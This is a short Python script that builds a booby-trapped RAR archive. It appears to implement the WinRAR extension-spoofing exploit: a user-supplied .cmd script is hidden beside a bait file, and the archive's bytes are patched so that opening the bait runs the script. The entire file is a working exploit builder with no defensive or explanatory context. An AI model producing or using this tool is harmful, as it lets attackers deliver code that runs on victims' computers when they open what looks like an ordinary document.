import os
import zipfile

def main():
    # Input Parameters
    script_file = input("[-] Enter script file name: ").strip()
    target_file = input("[-] Enter target file name: ").strip()

    # Extract file extension
    bait_ext = "." + target_file.split('.')[-1]

    # Remove build folder
    if os.path.exists("OUTPUT"):
        os.rmdir("OUTPUT")
    if os.path.exists("OUTPUT.zip"):
        os.remove("OUTPUT.zip")

    # Create required folders
    os.mkdir("OUTPUT")
    os.mkdir(f"OUTPUT/{target_file}A")

    copy_file(target_file, f"OUTPUT/{target_file}B")
    copy_file(script_file, f"OUTPUT/{target_file}A/{target_file}A.cmd")

    print("[-] File copied successfully.")

    # Create zip archive
    zip_filename = "OUTPUT.zip"
    with zipfile.ZipFile(zip_filename, "w") as zipf:
        copy_directory_contents_to_zip("OUTPUT", "OUTPUT", zipf)

    # Rename zip & Patch bytes
    os.rename("OUTPUT.zip", "OUTPUT.rar")
    x = 0
    if replace_bytes("OUTPUT.rar", f"{bait_ext}A", f"{bait_ext} ") is None:
        x += 1
    if replace_bytes("OUTPUT.rar", f"{bait_ext}B", f"{bait_ext} ") is None:
        x += 1

    if x == 2:
        print("[!] Successfully patched! Output file: OUTPUT.rar")
    else:
        print("[x] Error patching files.")

def replace_bytes(filename, from_str, to_str):
    with open(filename, "rb") as file:
        file_content = file.read()
        from_bytes = from_str.encode()
        to_bytes = to_str.encode()

        i = 0
        while i + len(from_bytes) <= len(file_content):
            if file_content[i:i + len(from_bytes)] == from_bytes:
                file_content = file_content[:i] + to_bytes + file_content[i + len(from_bytes):]
                i += len(to_bytes)
            else:
                i += 1

    with open(filename, "wb") as file:
        file.write(file_content)

def copy_directory_contents_to_zip(dir_path, base_dir, zip_writer):
    for root, _, files in os.walk(dir_path):
        for file in files:
            file_path = os.path.join(root, file)
            rel_path = os.path.relpath(file_path, base_dir)
            zip_writer.write(file_path, rel_path)

def copy_file(source_file, destination_file):
    with open(source_file, "rb") as src_file:
        with open(destination_file, "wb") as dest_file:
            dest_file.write(src_file.read())

if __name__ == "__main__":
    main()
